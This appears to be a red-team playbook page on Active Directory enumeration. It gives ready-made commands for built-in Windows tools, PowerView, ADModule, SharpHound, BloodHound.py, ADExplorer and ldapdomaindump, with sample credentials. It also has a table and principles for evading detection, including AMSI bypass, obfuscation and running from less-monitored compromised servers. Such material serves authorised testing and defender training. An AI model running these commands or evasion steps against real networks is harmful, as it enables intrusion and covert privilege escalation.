# Active Directory Enumeration

> **MITRE ATT&CK**: Discovery > T1087.002 - Account Discovery: Domain Account
> **Platforms**: Windows (Active Directory environments)
> **Required Privileges**: User (domain-authenticated)
> **OPSEC Risk**: Low-Medium (built-in commands are normal; PowerView/SharpHound raise alerts)

## Strategic Overview

Active Directory enumeration is the single most critical discovery phase in any Windows enterprise engagement. A domain-authenticated user has read access to nearly every object in the directory by default. The priority order matters: enumerate domain admins and trust relationships first, then high-value targets, then broad asset inventory. Rushing to tools like SharpHound before understanding the environment topology is a common junior mistake -- it generates noise before you know what you are looking for.

**Enumeration priority chain**: Current user context -> Domain Admins/privileged groups -> Trust relationships -> Computer objects (servers vs workstations) -> GPOs and ACLs -> Service accounts (Kerberoast targets) -> OUs and delegation.

## Technical Deep-Dive

### Built-in Tools (Living Off the Land)

```cmd
:: Current user context -- always start here
whoami /all
whoami /priv
net user %USERNAME% /domain

:: Domain controllers and domain info
nltest /dclist:CORP.LOCAL
nltest /domain_trusts /all_trusts
systeminfo | findstr /B /C:"Domain"

:: Privileged groups
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Schema Admins" /domain
net group "Administrators" /domain

:: All users and computers
net user /domain
net group /domain
net view /domain
```

### PowerView (PowerSploit)

```powershell
# Import (AMSI bypass may be required first)
Import-Module .\PowerView.ps1

# Core user and group enumeration
Get-DomainUser -Properties samaccountname,description,memberof | fl
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname   # Kerberoastable
Get-DomainGroup -AdminCount | Select name
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Computer enumeration
Get-DomainComputer -Properties dnshostname,operatingsystem | Sort-Object operatingsystem
Get-DomainComputer -Unconstrained       # Unconstrained delegation targets
Get-DomainComputer -TrustedToAuth       # Constrained delegation

# GPO and OU enumeration
Get-DomainGPO | Select displayname,gpcfilesyspath
Get-DomainOU | Select name,distinguishedname
Get-DomainGPOLocalGroup | Select GPODisplayName,GroupName

# ACL hunting -- find exploitable permissions
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}
Find-InterestingDomainAcl -ResolveGUIDs | Select IdentityReferenceName,ActiveDirectoryRights,ObjectDN
Find-LocalAdminAccess -Verbose           # Where current user has local admin

# Trust enumeration
Get-DomainTrust
Get-ForestDomain
Get-DomainForeignGroupMember
```

### ADModule (Microsoft Signed -- Less Detected)

```powershell
# Import without RSAT installed (use the DLL directly)
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1

Get-ADUser -Filter * -Properties * | Select SamAccountName,Description,MemberOf
Get-ADGroup -Filter {AdminCount -eq 1} | Select Name
Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
Get-ADDomain | Select DNSRoot,DomainMode,InfrastructureMaster
Get-ADForest | Select Domains,ForestMode,GlobalCatalogs
Get-ADTrust -Filter *
```

### BloodHound Collection

```powershell
# SharpHound -- full collection (noisiest)
.\SharpHound.exe -c All --zipfilename loot.zip

# DCOnly -- LDAP queries only, no session enumeration (stealthier)
.\SharpHound.exe -c DCOnly --zipfilename loot.zip

# Remote collection with BloodHound.py (does not touch target directly)
bloodhound-python -d corp.local -u jsmith -p 'Password1' -ns 10.10.10.1 -c All
```

### ADExplorer (Sysinternals -- Legitimate Admin Tool)

```cmd
:: Take AD snapshot for offline analysis -- appears as legitimate admin activity
ADExplorer.exe -snapshot "" corp_snapshot.dat
:: Later load in ADExplorer GUI for offline browsing
```

### ldapdomaindump (Python LDAP Enumeration)

```bash
# Dump entire domain to HTML/JSON for offline analysis
ldapdomaindump -u 'CORP\jsmith' -p 'Password1' 10.10.10.1 -o dump/
# Produces: domain_users.html, domain_groups.html, domain_computers.html, domain_policy.html
```

## Detection & Evasion

| Technique | Detection Vector | Evasion Approach |
|-----------|-----------------|------------------|
| net commands | Process creation logs (4688), cmd history | Use PowerShell equivalents or ADModule |
| PowerView | ScriptBlock logging (4104), AMSI | Obfuscation, in-memory loading, AMSI bypass |
| SharpHound | LDAP query volume, named pipe enum | Use DCOnly mode, run during business hours |
| ADExplorer | Legitimate Sysinternals tool | Rarely flagged -- excellent for stealth |
| BloodHound.py | Remote LDAP from non-domain system | Fewer host-based indicators but network detectable |

**Key evasion principles**: Enumerate in stages over days rather than all at once. Use signed Microsoft binaries (ADModule, ADExplorer) when possible. Avoid running SharpHound with `-c All` from a workstation with EDR -- use DCOnly or run from a compromised server with less monitoring.

## Cross-References

- [BloodHound Operational Guide](./bloodhound-guide.md)
- [Domain Trust Mapping](./domain-trust-mapping.md)
- [Kerberoasting](../06-credential-access/kerberoasting.md)
- [Active Directory Deep Dive](../12-active-directory-deep-dive/)

## References

- MITRE ATT&CK T1087.002: https://attack.mitre.org/techniques/T1087/002/
- PowerView Documentation: https://powersploit.readthedocs.io/
- SharpHound Wiki: https://bloodhound.readthedocs.io/
- ADModule: https://github.com/samratashok/ADModule
- ADExplorer: https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer
